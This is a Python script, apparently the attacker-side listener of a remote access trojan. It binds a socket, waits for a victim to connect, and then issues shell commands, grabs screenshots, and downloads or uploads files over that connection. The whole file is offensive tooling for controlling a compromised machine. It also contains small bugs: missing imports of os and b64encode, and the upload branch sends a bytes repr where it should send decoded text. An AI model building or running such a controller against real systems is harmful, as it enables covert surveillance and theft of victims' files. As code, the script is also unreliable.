from socket import socket, AF_INET, SOCK_STREAM
from base64 import b64decode

url = "127.0.0.1"
port = 4433

s = socket(AF_INET, SOCK_STREAM)
s.bind((url, port))
s.listen()
print("[*] Listening for connections")

conn, addr = s.accept()
print(f"[* Recieved connection from {addr[0]}:{addr[1]}]")

while True:
    inp = input("$ ")
    cmd = inp + '\n'

    # close connection
    if inp.lower() in ('q', 'quit'):
        conn.send(cmd.encode())
        resp = conn.recv(1024).decode()
        print(resp)
        exit(0)

    # screenshot
    if inp.lower() == "screenshot":
        conn.send(cmd.encode())
        b64_str = ''

        while True:
            tmp = conn.recv(32768).decode()
            b64_str += tmp
            if len(tmp) < 32768:
                break
        with open('screenshot.png', 'wb') as f:
            f.write(b64decode(b64_str))
        
        print("[*] Screenshot saved successfully")

    # download file_name
    elif inp.split(' ')[0].lower() == "download":
        conn.send(cmd.encode())
        b64_str = ''

        while True:
            tmp = conn.recv(32768).decode()
            b64_str += tmp
            if len(tmp) < 32768:
                break

        # file not found
        if "not found" in b64_str:
            print(b64_str)
            continue

        # file_name:b64_string
        file_name, b64_string = b64_str.split(':')
        with open(file_name, 'wb') as f:
            f.write(b64decode(b64_string))

        print("[*] File saved successfully")

        # upload file_name
    elif inp.split(' ')[0].lower() == "upload":
        file_name = inp.split(' ')[1].strip()
        if not os.path.exists(file_name):
            print("File does not exist")
        else:
            # file_name:b64_string
            file_content = ''
            with open(file_name, 'rb') as f:
                file_content = b64encode(f.read())
            tmp = ":".join([file_name, str(file_content) + "\n"])
            conn.send(tmp.encode())
            resp = conn.recv(1024).decode()
            print(resp)

    # shell commands
    else:
        conn.send(cmd.encode())
        resp = conn.recv(32768).decode()
        print(resp)
